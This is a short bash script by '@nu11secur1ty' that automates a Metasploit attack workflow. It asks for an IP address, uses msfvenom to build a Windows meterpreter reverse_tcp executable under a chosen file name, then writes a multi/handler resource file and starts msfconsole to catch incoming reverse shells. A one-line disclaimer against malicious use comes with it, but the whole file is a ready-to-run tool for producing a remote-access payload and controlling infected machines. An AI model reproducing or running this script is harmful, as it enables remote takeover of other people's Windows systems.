#!/usr/bin/bash
# Author @nu11secur1ty
# Do not use this for malicious purpose
# Ne izpolzvai za zlonamereni celi TUPAKO

echo "Type your IP to receive the reverse shell"
	read SRV
echo "Type the name of your exploit.exe"
	read exploit
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  SRVHOST=$SRV -b "\x00" -f exe -o $exploit
#--------------------------------
touch meterpreter.rc
	echo use exploit/multi/handler >> meterpreter.rc
	echo set PAYLOAD windows/meterpreter/reverse_tcp >> meterpreter.rc
		echo "Type your IP to receive the reverse shell"
		read LHOST
	echo set LHOST $LHOST >> meterpreter.rc
	echo set ExitOnSession false >> meterpreter.rc
		echo exploit -j -z >> meterpreter.rc
	cat meterpreter.rc
	msfconsole -r meterpreter.rc
exit 0;
